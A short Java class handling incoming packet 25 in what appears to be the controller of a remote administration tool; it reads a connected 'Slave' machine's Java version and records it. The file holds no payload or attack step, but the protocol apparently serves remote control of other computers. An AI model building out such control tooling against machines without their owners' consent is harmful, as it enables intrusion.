package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import com.redpois0n.Slave;

public class Packet25InitJavaVersion extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String version = slave.readLine();
		slave.setJavaVersion(version);
	}

	@Override
	public byte getPacketId() {
		return 25;
	}

}
